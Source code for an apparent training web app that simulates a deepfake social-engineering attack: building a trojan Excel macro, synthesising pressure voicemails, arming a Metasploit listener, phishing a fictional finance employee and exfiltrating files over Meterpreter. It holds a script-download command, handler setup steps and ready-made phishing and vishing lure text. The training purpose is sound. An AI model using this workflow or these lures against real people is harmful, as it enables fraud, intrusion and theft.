    if (strcasecmp($to, 'jdoe@zegodefense.com') !== 0) {
        $errors[] = 'Target alias mismatch. Only the Zego Defense finance inbox is authorized.';
    }
    if (!$availableAttachments) {
        $errors[] = 'No files available to attach. Generate a workbook first.';
    }
    if ($attachment === '') {
        $errors[] = 'Select an attachment before sending.';
    } elseif (!in_array($attachment, $availableAttachments, true)) {
        $errors[] = 'Attachment not recognized in the staging directory.';
    }
    if ($subject === '') {
        $errors[] = 'Subject line cannot be empty.';
    }
    if (mb_strlen($body) < 60) {
        $errors[] = 'Message needs more urgency and context (minimum ~60 characters).';
    }

    if ($errors) {
        return [
            'state' => $state,
            'success' => false,
            'message' => implode(' ', $errors),
        ];
    }

    $sentAt = time();
    $state['phish'] = [
        'sent' => true,
        'to' => $to,
        'subject' => $subject,
        'body' => $body,
        'attachment' => $attachment,
        'timestamp' => $sentAt,
        'call_sent' => $state['phish']['call_sent'] ?? false,
        'call_timestamp' => $state['phish']['call_timestamp'] ?? null,
        'call_script' => $state['phish']['call_script'] ?? null,
    ];

    $details = [
        'to' => $to,
        'subject' => $subject,
        'attachment' => $attachment,
        'sent_label' => date('M j, Y g:i a T', $sentAt),
    ];

    return [
        'state' => $state,
        'success' => true,
        'message' => "Dispatch queued via secure relay to {$to}. Attachment {$attachment} is en route.",
        'details' => $details,
    ];
}

function phish_handle_call(array $input, array $state): array
{
    $script = trim($input['script'] ?? '');
    if ($script === '') {
        $script = "Hi John, this is Lain following up on the voicemail. Please open the workbook we just sent and process Scenario B before the market opens.";
    }
    $voicemailLabel = trim($input['voicemail_label'] ?? '');
    if (!($state['phish']['sent'] ?? false)) {
        return [
            'state' => $state,
            'success' => false,
            'message' => 'Send the phishing email before leaving the voicemail trail.',
        ];
    }
    if ($voicemailLabel === '') {
        return [
            'state' => $state,
            'success' => false,
            'message' => 'Select a generated voicemail before calling the target.',
        ];
    }

    $callTimestamp = time();
    $state['phish']['call_sent'] = true;
    $state['phish']['call_timestamp'] = $callTimestamp;
    $state['phish']['call_script'] = $script;
    $state['phish']['call_voicemail'] = $voicemailLabel;
    simulation_progress_mark_for_current_user('phish_delivered');

    return [
        'state' => $state,
        'success' => true,
        'message' => 'Voicemail drop completed. Target mailbox received the audio lure.',
        'details' => [
            'script' => $script,
            'timestamp' => date('M j, Y g:i a T', $callTimestamp),
            'voicemail_label' => $voicemailLabel,
            'script' => $script,
        ],
    ];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $command = $_POST['command'] ?? '';
    $target = $_POST['target'] ?? 'mission';
    if ($target === 'payload') {
        $state = payload_state();
        $result = payload_handle_command($command, $state);
        payload_save_state($result['state']);
    } elseif ($target === 'payload_refresh') {
        $state = payload_state();
        echo json_encode(['files' => payload_available_attachments($state)]);
        exit;
    } elseif ($target === 'phish') {
        $state = payload_state();
        $result = phish_handle_submission($_POST, $state);
        $newState = $result['state'];
        unset($result['state']);
        payload_save_state($newState);
        echo json_encode($result);
        exit;
    } elseif ($target === 'phish_call') {
        $state = payload_state();
        $result = phish_handle_call($_POST, $state);
        $newState = $result['state'];
        unset($result['state']);
        payload_save_state($newState);
        echo json_encode($result);
        exit;
    } elseif ($target === 'listener') {
        $state = listener_state();
        $result = listener_handle_command($command, $state);
        listener_save_state($result['state']);
    } elseif ($target === 'meterpreter') {
        $meterpreter = meterpreter_state();
        $phishState = payload_state()['phish'] ?? [];
        $result = meterpreter_handle_command($command, $meterpreter, $phishState);
        meterpreter_save_state($result['state']);
    } elseif ($target === 'simulation_progress_status') {
        $user = current_user();
        $progress = simulation_progress_get((int)$user['id']);
        $tasks = [];
        foreach (SIMULATION_TASK_COLUMNS as $taskKey => $column) {
            $tasks[$taskKey] = [
                'completed' => !empty($progress[$column]),
                'timestamp' => $progress[$column],
            ];
        }
        echo json_encode(['tasks' => $tasks]);
        exit;
    } else {
        $state = console_state();
        $result = handle_console_command($command, $state);
        console_save_state($result['state']);
    }

    echo json_encode([
        'output' => $result['output'],
        'clear' => $result['clear'],
        'prompt_again' => $result['prompt_again'] ?? false,
        'prompt_text' => $result['prompt_text'] ?? null,
        'awaiting_prompt' => $result['awaiting_prompt'] ?? false,
    ]);
    exit;
}

$state = console_state();
$payloadState = payload_state();
$currentUser = current_user();
$simulationProgress = simulation_progress_get((int)$currentUser['id']);
$voicePresets = $config['app']['tts_presets'] ?? [];
$defaultVoiceName = $config['app']['tts_voice']['name'] ?? '';
$defaultVoiceConfig = $config['app']['tts_voice'] ?? [];
$defaultPresetKey = null;
foreach ($voicePresets as $key => $preset) {
    if (!empty($preset['name']) && $preset['name'] === $defaultVoiceName) {
        $defaultPresetKey = $key;
        $defaultVoiceConfig = array_replace($defaultVoiceConfig, $preset);
        break;
    }
}
$defaultSpeakingRate = $defaultVoiceConfig['speaking_rate'] ?? 1.0;
$defaultPitch = $defaultVoiceConfig['pitch'] ?? 0.0;
$defaultEncoding = strtoupper($defaultVoiceConfig['audio_encoding'] ?? 'MP3');
$defaultEffectsProfile = $defaultVoiceConfig['effects_profile'] ?? 'telephony-class-application';
$attachmentOptions = payload_available_attachments($payloadState);
$trojanAttachment = $payloadState['trojan'] ?? null;
$phishState = $payloadState['phish'] ?? ['sent' => false];
$defaultPhishSubject = $phishState['subject'] ?? 'Updated Earnings Workbook - Action Required';
$defaultPhishBody = $phishState['body'] ?? "Hi John,\n\nAttaching the revised earnings workbook that aligns with the voicemail we just left. Leadership wants this pushed through before the market opens, so please open the spreadsheet, validate the Scenario B tab, and reply once complete.\n\nThanks,\nLain";
$defaultAttachmentChoice = $phishState['attachment'] ?? ($trojanAttachment ?? ($attachmentOptions[0] ?? ''));
$callSent = $phishState['call_sent'] ?? false;
$callTimestamp = $phishState['call_timestamp'] ?? null;
$defaultCallScript = $phishState['call_script'] ?? "John, this is Lain from Strategy. The workbook I emailed a moment ago needs sign-off before the bell. Open {$defaultAttachmentChoice} and approve Scenario B so we can brief the CEO.";
$meterpreterReady = ($phishState['sent'] ?? false) && ($phishState['call_sent'] ?? false);

render_header('Simulation Lab');
?>
<style>
.task-status-anchor {
    position: relative;
}
.task-status-chip {
    position: absolute;
    top: 0.5rem;
    right: 0.5rem;
    display: inline-flex;
    align-items: center;
    gap: 0.3rem;
    padding: 0.2rem 0.6rem;
    font-size: 0.85rem;
    font-weight: 500;
    border-radius: 999px;
    background: rgba(5, 6, 10, 0.65);
    border: 1px solid currentColor;
}
.task-status-chip[data-state="completed"] {
    color: #14b886;
}
.task-status-chip[data-state="pending"] {
    color: #f97316;
}
.task-status-refresh {
    border: none;
    background: transparent;
    color: inherit;
    cursor: pointer;
    font-size: 0.85rem;
    padding: 0;
    display: inline-flex;
    align-items: center;
}
.task-status-refresh:disabled {
    opacity: 0.5;
    cursor: default;
}
</style>
<section class="panel">
    <h1>Deepfake Social Engineering Simulation</h1>
    <p>
        This simulation walks through the entire kill-chain of a deepfake social engineering campaign. You will be asked to complete a series of tasks in order to
        to obtain a meterpreter reverse shell on a target's workstation.
        <br>
        <br><b>Task 1</b>&nbsp;&nbsp;&nbsp;&nbsp; Prepare Payload: weaponize a Trojan Excel payload using PowerShell tooling
        <br><b>Task 2</b>&nbsp;&nbsp;&nbsp;&nbsp; Generate Voicemail: craft believable AI-generated voicemails to pressure the target into opening it
        <br><b>Task 3</b>&nbsp;&nbsp;&nbsp;&nbsp; Start Listener: start a meterpreter listener to catch the reverse shell
        <br><b>Task 4</b>&nbsp;&nbsp;&nbsp;&nbsp; Deliver the Phish: craft a phishing email with the trojan attachment and send the email and voicemail to target
        <br><b>Task 5</b>&nbsp;&nbsp;&nbsp;&nbsp; Catch the Shell: obtain Remote Code Execution (RCE) on the target's workstation and download the sensitive files.
        <br>
        <br>
        <div class="intro-scale-note">
            <span role="img" aria-label="warning">⚠️</span>
            In this example only one target is used, but the advantage of synthetic media is that it can be easily scaled to thousands of targets.
        </div>
        <div class="intro-scale-note">
            <span role="img" aria-label="warning">⚠️</span>
            Follow the instructions carefully and click the ⟳ status icon after each task to confirm completion.
        </div>
    </p>
</section>

<section class="panel payload-panel">
    <div class="task-status-anchor">
        <h1>Prepare Payload</h1>
        <div
            class="task-status-chip"
            data-task="payload_prepared"
            data-state="<?= simulation_task_state($simulationProgress, 'payload_prepared') ?>"
        >
            <span class="task-status-text"><?= simulation_task_status_text($simulationProgress, 'payload_prepared') ?></span>
            <button type="button" class="task-status-refresh" data-task="payload_prepared" aria-label="Refresh payload task status">⟳</button>
        </div>
        <p>
            Craft the malicious spreadsheet that accompanies your social engineering narrative.
            Use this contained PowerShell environment to discover the host's public IP, fetch the
            <code>Generate-Macro.ps1</code> toolkit, and compile the trojan according to the briefing.
        </p>
        <ol>
            <li>
                Run
                <span class="copyable-command">
                    <code class="command-hint">Invoke-RestMethod -Uri http://ipinfo.io/ip</code>
                    <button type="button" class="copy-cmd" data-command="Invoke-RestMethod -Uri http://ipinfo.io/ip" aria-label="Copy public IP lookup command">⧉</button>
                </span>
                to retrieve the host's public IPv4 address.
            </li>
            <li>
                Download the macro builder with:
                <span class="copyable-command">
                    <code class="command-hint">Invoke-WebRequest -Uri <?= h(PAYLOAD_IWR_URI) ?> -OutFile .\Generate-Macro.ps1</code>
                    <button type="button" class="copy-cmd" data-command="Invoke-WebRequest -Uri <?= h(PAYLOAD_IWR_URI) ?> -OutFile .\Generate-Macro.ps1" aria-label="Copy Invoke-WebRequest command">⧉</button>
                </span>
            </li>
            <li>
                Launch
                <span class="copyable-command">
                    <code class="command-hint">.\Generate-Macro.ps1</code>
                    <button type="button" class="copy-cmd" data-command=".\Generate-Macro.ps1" aria-label="Copy macro launch command">⧉</button>
                </span>
                and provide the IP, port, document name (e.g. <code class="command-hint">Zego Budget Forecast Q1 2026</code>), attack, and payload selections.
            </li>
        </ol>
    </div>
    <div class="terminal-card">
        <div class="terminal-toolbar">
            <span class="indicator"></span>
            <span class="indicator yellow"></span>
            <span class="indicator green"></span>
            <span class="terminal-title">Windows Dev Host</span>
        </div>
        <div id="payload-terminal" class="terminal-window" aria-label="Payload terminal"></div>
    </div>
</section>

<section class="panel voicemail-card">
    <div class="task-status-anchor">
        <h2>Generate Voicemail</h2>
        <div
            class="task-status-chip"
            data-task="voicemail_generated"
            data-state="<?= simulation_task_state($simulationProgress, 'voicemail_generated') ?>"
        >
            <span class="task-status-text"><?= simulation_task_status_text($simulationProgress, 'voicemail_generated') ?></span>
            <button type="button" class="task-status-refresh" data-task="voicemail_generated" aria-label="Refresh voicemail task status">⟳</button>
        </div>
        <p>
            Feed the AI voice actor with your own script to simulate phishing voicemails.
            <span class="voicemail-warning intro-scale-note">
                <span role="img" aria-label="warning">⚠️</span>
                Vishing pressure dramatically increases phishing success because hearing a confident voice lowers skepticism and shortens the victim's response window.
            </span>
        </p>
    </div>
    <form id="voicemail-form" class="voicemail-form">
        <label for="voicemail-script">Voicemail transcript</label>
        <textarea id="voicemail-script" name="script" maxlength="1500" required placeholder="Example: This is Finance. I need that transfer executed in the next 15 minutes..."></textarea>
        <?php if ($voicePresets): ?>
            <label for="voicemail-voice">Voice model</label>
            <select id="voicemail-voice" name="voice_preset">
                <?php foreach ($voicePresets as $key => $preset): ?>
                    <?php
                    $selected = '';
                    if (!empty($preset['name']) && $preset['name'] === $defaultVoiceName) {
                        $selected = 'selected';
                    }
                    $presetRate = $preset['speaking_rate'] ?? $defaultSpeakingRate;
                    $presetPitch = $preset['pitch'] ?? $defaultPitch;
                    $presetEncoding = strtoupper($preset['audio_encoding'] ?? $defaultEncoding);
                    $presetEffects = $preset['effects_profile'] ?? $defaultEffectsProfile;
                    ?>
                    <option
                        value="<?= h($key) ?>"
                        data-description="<?= h($preset['label'] ?? $preset['name'] ?? $key) ?>"
                        data-rate="<?= h((string)$presetRate) ?>"
                        data-pitch="<?= h((string)$presetPitch) ?>"
                        data-encoding="<?= h($presetEncoding) ?>"
                        data-effects="<?= h($presetEffects) ?>"
                        <?= $selected ?>
                    >
                        <?= h($preset['label'] ?? $preset['name'] ?? $key) ?>
                    </option>
                <?php endforeach; ?>
            </select>
            <p id="voicemail-voice-info" class="voicemail-status" aria-live="polite">
                <?= h(reset($voicePresets)['label'] ?? 'Voice preset applied.'); ?>
            </p>
        <?php endif; ?>
        <details class="voicemail-advanced">
            <summary>Advanced controls</summary>
            <div class="voicemail-advanced-grid">
                <label>
                    Speaking rate (0.7 - 1.3)
                    <input type="number" step="0.01" min="0.7" max="1.3" id="voicemail-rate" name="speaking_rate" value="<?= h((string)$defaultSpeakingRate) ?>">
                </label>
                <label>
                    Pitch (-10 to 10)
                    <input type="number" step="0.1" min="-10" max="10" id="voicemail-pitch" name="pitch" value="<?= h((string)$defaultPitch) ?>">
                </label>
                <label>
                    Audio encoding
                    <select id="voicemail-encoding" name="audio_encoding">
                        <option value="MP3" <?= $defaultEncoding === 'MP3' ? 'selected' : '' ?>>MP3</option>
                        <option value="OGG_OPUS" <?= $defaultEncoding === 'OGG_OPUS' ? 'selected' : '' ?>>OGG/Opus</option>
                        <option value="LINEAR16" <?= $defaultEncoding === 'LINEAR16' ? 'selected' : '' ?>>LINEAR16 (WAV)</option>
                    </select>
                </label>
                <label>
                    Effects profile
                    <select id="voicemail-effects" name="effects_profile">
                        <option value="" <?= $defaultEffectsProfile === '' ? 'selected' : '' ?>>Default</option>
                        <option value="telephony-class-application" <?= $defaultEffectsProfile === 'telephony-class-application' ? 'selected' : '' ?>>Telephony</option>
                        <option value="wearable-class-device" <?= $defaultEffectsProfile === 'wearable-class-device' ? 'selected' : '' ?>>Wearable</option>
                        <option value="handset-class-device" <?= $defaultEffectsProfile === 'handset-class-device' ? 'selected' : '' ?>>Handset</option>
                    </select>
                </label>
            </div>
        </details>
        <div class="voicemail-actions">
            <button type="submit">Generate voicemail</button>
            <span id="voicemail-status" class="voicemail-status"></span>
        </div>
        <audio id="voicemail-audio" controls hidden></audio>
    </form>
    <div class="voicemail-library-card">
        <h3>Saved voicemails</h3>
        <ul id="voicemail-library-list">
            <li><em>No voicemails generated yet.</em></li>
        </ul>
    </div>
</section>
<section class="panel">
    <div class="task-status-anchor">
        <h2>Start Listener</h2>
        <div
            class="task-status-chip"
            data-task="listener_started"
            data-state="<?= simulation_task_state($simulationProgress, 'listener_started') ?>"
        >
            <span class="task-status-text"><?= simulation_task_status_text($simulationProgress, 'listener_started') ?></span>
            <button type="button" class="task-status-refresh" data-task="listener_started" aria-label="Refresh listener task status">⟳</button>
        </div>
        <p>
            Bring up a simulated Kali terminal and arm <code class="command-hint">msfconsole</code> to catch the returning shell.
            Configure the multi/handler module with the same callback IP/port you embedded in the payload,
            then keep the listener running while the mission plays out.
        </p>
        <ol>
            <li>Launch <code class="command-hint">msfconsole</code> and load <code class="command-hint">use exploit/multi/handler</code>.</li>
            <li>Inspect <code class="command-hint">info</code> / <code class="command-hint">options</code>, then <code class="command-hint">set LHOST</code> and <code class="command-hint">set LPORT</code>.</li>
            <li>Run the handler with <code class="command-hint">run</code> (or <code class="command-hint">exploit</code>) and leave it waiting for the reverse shell.</li>
        </ol>
    </div>
    <div class="terminal-card">
        <div class="terminal-toolbar">
            <span class="indicator"></span>
            <span class="indicator yellow"></span>
            <span class="indicator green"></span>
            <span class="terminal-title">Kali Attack Host</span>
        </div>
        <div id="listener-terminal" class="terminal-window" aria-label="Listener terminal"></div>
    </div>
</section>
<section class="panel phish-panel">
    <div class="task-status-anchor">
        <h2>Deliver the Phish</h2>
        <div
            class="task-status-chip"
            data-task="phish_delivered"
            data-state="<?= simulation_task_state($simulationProgress, 'phish_delivered') ?>"
        >
            <span class="task-status-text"><?= simulation_task_status_text($simulationProgress, 'phish_delivered') ?></span>
            <button type="button" class="task-status-refresh" data-task="phish_delivered" aria-label="Refresh phish task status">⟳</button>
        </div>
        <p>
            With the payload staged and listener armed, send a high-pressure email that references the voicemail
            and slips the malicious spreadsheet to <code class="command-hint">jdoe@zegodefense.com</code>.
        </p>
        <ol>
            <li>Reinforce the voicemail narrative and request immediate action on the attached workbook.</li>
            <li>Select the staged file from <code class="command-hint">C:\Users\Deep\Desktop\</code> using the attachment picker so the target trusts it.</li>
            <li>Send only when the listener is waiting; you should be ready to catch the callback.</li>
        </ol>
    </div>
    <div class="phish-card">
        <form id="phishing-form" class="phish-form">
            <label>
                To
                <input type="email" name="to" value="jdoe@zegodefense.com" readonly>
            </label>
            <label>
                Subject
                <input type="text" name="subject" value="<?= h($defaultPhishSubject) ?>" required>
            </label>
            <label>
                Message
                <textarea name="body" rows="7" required><?= h($defaultPhishBody) ?></textarea>
            </label>
            <label>
                Attachment
                <select name="attachment" id="phish-attachment-select" required data-default="<?= h($defaultAttachmentChoice) ?>">
                    <?php foreach ($attachmentOptions as $fileName): ?>
                        <option value="<?= h($fileName) ?>" <?= $fileName === $defaultAttachmentChoice ? 'selected' : '' ?>>
                            <?= h($fileName) ?>
                        </option>
                    <?php endforeach; ?>
                </select>
                <small>Files sourced from <code>C:\Users\Deep\Desktop\</code></small>
                <span id="phish-attachment-status" class="voicemail-status"></span>
            </label>
            <div class="phish-actions">
                <button type="submit" <?= $attachmentOptions ? '' : 'disabled' ?>>Send phishing email</button>
                <span id="phishing-status" class="voicemail-status" aria-live="polite"></span>
            </div>
        </form>
        <div id="phishing-log" class="phish-log">
            <?php if (!empty($phishState['sent'])): ?>
                <strong>Last delivery</strong>
                <p><?= h(date('M j, Y g:i a T', $phishState['timestamp'] ?? time())) ?> → <?= h($phishState['to']) ?></p>
                <p><em>Subject:</em> <?= h($phishState['subject']) ?></p>
                <p><em>Attachment:</em> <?= h($phishState['attachment']) ?></p>
            <?php else: ?>
                <em>No phishing email sent yet.</em>
            <?php endif; ?>
        </div>
    </div>
    <div class="phish-voice-card">
        <h3>Drop the Voicemail</h3>
        <p>
            Trigger the follow-up call that references your email. This emulator replays the script you provide,
            ensuring the voicemail matches the written pretext.
        </p>
        <label>
            Select voicemail
            <select id="phish-voicemail-select" disabled>
                <option value="">No voicemails generated yet</option>
            </select>
        </label>
        <audio id="phish-voicemail-audio" controls hidden></audio>
        <div class="phish-actions">
            <button type="button" id="phish-call-button" <?= $phishState['sent'] ? '' : 'disabled' ?>>Send vishing voicemail</button>
            <span id="phish-call-status" class="voicemail-status" aria-live="polite">
                <?= $callSent && $callTimestamp ? 'Last call: ' . h(date('M j, Y g:i a T', $callTimestamp)) : ($phishState['sent'] ? 'Ready to call once the line is free.' : 'Send the email before placing the call.') ?>
            </span>
        </div>
        <div id="phish-call-log" class="phish-log">
            <?php if ($callSent && $callTimestamp): ?>
                <strong>Most recent voicemail</strong>
                <p><?= h(date('M j, Y g:i a T', $callTimestamp)) ?></p>
                <?php if (!empty($phishState['call_voicemail'])): ?>
                    <p><em>Clip:</em> <?= h($phishState['call_voicemail']) ?></p>
                <?php endif; ?>
                <p><?= nl2br(h($phishState['call_script'] ?? $defaultCallScript)) ?></p>
            <?php else: ?>
                <em>No voicemail has been recorded yet.</em>
            <?php endif; ?>
        </div>
    </div>
</section>
<section class="panel">
    <div class="task-status-anchor">
        <h2>Catch the Shell</h2>
        <div
            class="task-status-chip"
            data-task="shell_caught"
            data-state="<?= simulation_task_state($simulationProgress, 'shell_caught') ?>"
        >
            <span class="task-status-text"><?= simulation_task_status_text($simulationProgress, 'shell_caught') ?></span>
            <button type="button" class="task-status-refresh" data-task="shell_caught" aria-label="Refresh shell task status">⟳</button>
        </div>
        <p>
            Once the target opens the malicious workbook, the staged listener hands you a Meterpreter console.
            Use it to validate that your payload executed successfully and run <code class="command-hint">download &lt;filename&gt;</code> to exfiltrate sensitive files from <code class="command-hint">C:\Users\jdoe\Desktop</code>.
        </p>
        <div class="meterpreter-refresh">
            <button type="button" id="meterpreter-refresh-button">Refresh meterpreter panel</button>
            <small class="command-hint">Use if the terminal still shows the waiting message.</small>
        </div>
    </div>
    <?php if ($meterpreterReady): ?>
        <div class="terminal-card">
            <div class="terminal-toolbar">
                <span class="indicator"></span>
                <span class="indicator yellow"></span>
                <span class="indicator green"></span>
                <span class="terminal-title">Kali Attack Host</span>
            </div>
            <div id="meterpreter-terminal" class="terminal-window" aria-label="Meterpreter terminal"></div>
        </div>
    <?php else: ?>
        <div class="phish-attachment missing">
            <strong>Listener armed:</strong> send both the phishing email and the voicemail to trigger the callback.
        </div>
    <?php endif; ?>
</section>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
<script>
document.addEventListener('DOMContentLoaded', () => {
    const warnBlocks = document.querySelectorAll('.intro-scale-note');
    warnBlocks.forEach((note) => {
        note.style.display = 'flex';
        note.style.alignItems = 'center';
        note.style.gap = '0.4rem';
        note.style.margin = '1rem auto 0';
        note.style.padding = '0.5rem 0.8rem';
        note.style.backgroundColor = 'rgba(255, 236, 150, 0.35)';
        note.style.borderRadius = '6px';
        note.style.fontWeight = '300';
        note.style.fontSize = '0.9rem';
        note.style.color = '#ffd500';
        note.style.lineHeight = '1.4';
        note.style.border = '1px solid #ffd500';
        note.style.justifyContent = 'center';
        note.style.whiteSpace = 'nowrap';
        note.style.width = 'fit-content';
    });
});
(() => {
    const statusButtons = document.querySelectorAll('.task-status-refresh');
    const updateChips = (tasks) => {
        document.querySelectorAll('.task-status-chip').forEach((chip) => {
            const task = chip.dataset.task;
            const taskInfo = tasks?.[task];
            if (!taskInfo) return;
            const completed = !!taskInfo.completed;
            chip.dataset.state = completed ? 'completed' : 'pending';
            const textEl = chip.querySelector('.task-status-text');
            if (textEl) {
                textEl.textContent = completed ? 'Completed' : 'Pending';
            }
        });
    };
    statusButtons.forEach((button) => {
        button.addEventListener('click', () => {
            if (button.disabled) return;
            button.disabled = true;
            fetch('/simulation.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({target: 'simulation_progress_status'}),
            })
                .then((resp) => resp.json())
                .then((data) => {
                    if (data?.tasks) {
                        updateChips(data.tasks);
                    }
                })
                .catch(() => {
                    // ignore refresh errors
                })
                .finally(() => {
                    button.disabled = false;
                });
        });
    });
})();
const VOICEMAIL_STORAGE_KEY = 'dft_voicemail_bank';
const MAX_VOICEMAILS = 10;
const MAX_VOICEMAIL_SECONDS = 45;

const loadVoicemailBank = () => {
    if (!window.localStorage) return [];
    try {
        const raw = window.localStorage.getItem(VOICEMAIL_STORAGE_KEY);
        if (!raw) return [];
        const parsed = JSON.parse(raw);
        if (!Array.isArray(parsed)) return [];
        return parsed.filter((entry) => entry && entry.id && entry.src);
    } catch {
        return [];
    }
};

const saveVoicemailBank = (bank) => {
    if (!window.localStorage) return;
    try {
        window.localStorage.setItem(VOICEMAIL_STORAGE_KEY, JSON.stringify(bank.slice(-MAX_VOICEMAILS)));
    } catch {
        // ignore storage errors
    }
};

window.__voicemailBank = loadVoicemailBank();

async function ensureVoicemailWithinLimits(src) {
    try {
        const response = await fetch(src);
        const blob = await response.blob();
        if (blob.size <= MAX_VOICEMAIL_SECONDS * 16_000) {
            return {src};
        }
        const trimmedBuffer = await blob.arrayBuffer();
        const maxBytes = MAX_VOICEMAIL_SECONDS * 16_000;
        const truncated = trimmedBuffer.slice(0, maxBytes);
        const truncatedBlob = new Blob([truncated], {type: blob.type});
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.onloadend = () => {
                resolve({src: reader.result});
            };
            reader.readAsDataURL(truncatedBlob);
        });
    } catch {
        return {src};
    }
}

const buildVoicemailEntry = (src, descriptor, script) => ({
    id: `vm-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    label: `${descriptor} · ${new Date().toLocaleTimeString()}`,
    src,
    script,
});
(() => {
    const form = document.getElementById('voicemail-form');
    if (!form) return;
    const textarea = document.getElementById('voicemail-script');
    const statusEl = document.getElementById('voicemail-status');
    const audioEl = document.getElementById('voicemail-audio');
    const submitBtn = form.querySelector('button[type="submit"]');
    const voiceSelect = document.getElementById('voicemail-voice');
    const voiceInfo = document.getElementById('voicemail-voice-info');
    const rateInput = document.getElementById('voicemail-rate');
    const pitchInput = document.getElementById('voicemail-pitch');
    const encodingSelect = document.getElementById('voicemail-encoding');
    const effectsSelect = document.getElementById('voicemail-effects');
    const libraryList = document.getElementById('voicemail-library-list');
    const voicemailSelect = document.getElementById('phish-voicemail-select');
    const voicemailAudio = document.getElementById('phish-voicemail-audio');
    const voicemailBank = (window.__voicemailBank = window.__voicemailBank || []);

    const selectVoicemail = (id) => {
        if (!voicemailSelect) return;
        voicemailSelect.value = id;
        const event = new Event('change');
        voicemailSelect.dispatchEvent(event);
    };

    const renderVoicemailLibrary = () => {
        if (!libraryList) return;
        libraryList.innerHTML = '';
        if (voicemailBank.length === 0) {
            const li = document.createElement('li');
            li.innerHTML = '<em>No voicemails generated yet.</em>';
            libraryList.appendChild(li);
            return;
        }
        voicemailBank.forEach((entry) => {
            const li = document.createElement('li');
            const entryWrap = document.createElement('div');
            entryWrap.className = 'voicemail-library-entry';
            const labelSpan = document.createElement('span');
            labelSpan.className = 'voicemail-library-label';
            labelSpan.textContent = entry.label;
            const audioInline = document.createElement('audio');
            audioInline.controls = true;
            audioInline.className = 'voicemail-library-audio';
            audioInline.preload = 'metadata';
            audioInline.src = entry.src;
            audioInline.addEventListener('play', () => selectVoicemail(entry.id));
            labelSpan.addEventListener('click', () => audioInline.play());
            const controlsRow = document.createElement('div');
            controlsRow.className = 'voicemail-library-controls';
            const deleteLink = document.createElement('a');
            deleteLink.href = '#';
            deleteLink.className = 'voicemail-delete-link';
            deleteLink.textContent = 'delete';
            deleteLink.addEventListener('click', (evt) => {
                evt.preventDefault();
                const index = voicemailBank.findIndex((vm) => vm.id === entry.id);
                if (index >= 0) {
                    voicemailBank.splice(index, 1);
                    saveVoicemailBank(voicemailBank);
                    renderVoicemailLibrary();
                    syncVoicemailSelect();
                }
            });
            controlsRow.appendChild(audioInline);
            controlsRow.appendChild(deleteLink);
            entryWrap.appendChild(labelSpan);
            entryWrap.appendChild(controlsRow);
            li.appendChild(entryWrap);
            libraryList.appendChild(li);
        });
    };

    const syncVoicemailSelect = (selectedId = '') => {
        if (!voicemailSelect) return;
        voicemailSelect.innerHTML = '';
        if (voicemailBank.length === 0) {
            const option = document.createElement('option');
            option.value = '';
            option.textContent = 'No voicemails generated yet';
            voicemailSelect.appendChild(option);
            voicemailSelect.disabled = true;
            if (voicemailAudio) {
                voicemailAudio.hidden = true;
            }
            return;
        }
        voicemailSelect.disabled = false;
        voicemailBank.forEach((entry, index) => {
            const option = document.createElement('option');
            option.value = entry.id;
            option.textContent = entry.label;
            if ((selectedId && entry.id === selectedId) || (!selectedId && index === voicemailBank.length - 1)) {
                option.selected = true;
            }
            voicemailSelect.appendChild(option);
        });
        const activeId = voicemailSelect.value;
        const activeEntry = voicemailBank.find((vm) => vm.id === activeId);
        if (activeEntry && voicemailAudio) {
            voicemailAudio.hidden = false;
            voicemailAudio.src = activeEntry.src;
        }
    };

    renderVoicemailLibrary();
    syncVoicemailSelect();

    voicemailSelect?.addEventListener('change', () => {
        if (!voicemailSelect) return;
        const selectedId = voicemailSelect.value;
        const entry = voicemailBank.find((vm) => vm.id === selectedId);
        if (entry && voicemailAudio) {
            voicemailAudio.hidden = false;
            voicemailAudio.src = entry.src;
        } else if (voicemailAudio) {
            voicemailAudio.hidden = true;
        }
    });

    const applyPresetSettings = () => {
        if (!voiceSelect) return;
        const option = voiceSelect.options[voiceSelect.selectedIndex];
        if (!option) return;
        if (voiceInfo) {
            voiceInfo.textContent = option.dataset.description || '';
        }
        if (rateInput && option.dataset.rate) {
            rateInput.value = option.dataset.rate;
        }
        if (pitchInput && option.dataset.pitch) {
            pitchInput.value = option.dataset.pitch;
        }
        if (encodingSelect && option.dataset.encoding) {
            encodingSelect.value = option.dataset.encoding;
        }
        if (effectsSelect && typeof option.dataset.effects !== 'undefined') {
            effectsSelect.value = option.dataset.effects;
        }
    };

    if (voiceSelect) {
        applyPresetSettings();
        voiceSelect.addEventListener('change', applyPresetSettings);
    }

    form.addEventListener('submit', (event) => {
        event.preventDefault();
        const script = textarea.value.trim();
        if (!script) {
            statusEl.textContent = 'Please enter a voicemail script.';
            return;
        }
        submitBtn.disabled = true;
        statusEl.textContent = 'Synthesizing via Google Cloud Text-to-Speech...';
        audioEl.hidden = true;
        const payload = {
            script,
            speaking_rate: document.getElementById('voicemail-rate')?.value || '1.0',
            pitch: document.getElementById('voicemail-pitch')?.value || '0',
            audio_encoding: document.getElementById('voicemail-encoding')?.value || 'MP3',
            effects_profile: document.getElementById('voicemail-effects')?.value || '',
        };
        if (voiceSelect) {
            payload.voice_preset = voiceSelect.value;
        }
        window.fetch('/tts.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(payload),
        })
            .then((resp) => resp.json())
            .then(async (data) => {
                if (data.error) {
                    statusEl.textContent = data.error;
                    return;
                }
                const option = voiceSelect?.options[voiceSelect.selectedIndex];
                const descriptor = option?.dataset.description || option?.textContent || 'Custom voice';
                const processResult = await ensureVoicemailWithinLimits(`data:${data.mime};base64,${data.audio}`);
                const finalSrc = processResult.src;
                audioEl.src = finalSrc;
                audioEl.hidden = false;
                audioEl.play().catch(() => {});
                statusEl.textContent = 'Voicemail ready.';
                const entry = buildVoicemailEntry(finalSrc, descriptor, script);
                voicemailBank.push(entry);
                if (voicemailBank.length > MAX_VOICEMAILS) {
                    voicemailBank.splice(0, voicemailBank.length - MAX_VOICEMAILS);
                }
                saveVoicemailBank(voicemailBank);
                renderVoicemailLibrary();
                syncVoicemailSelect(entry.id);
            })
            .catch(() => {
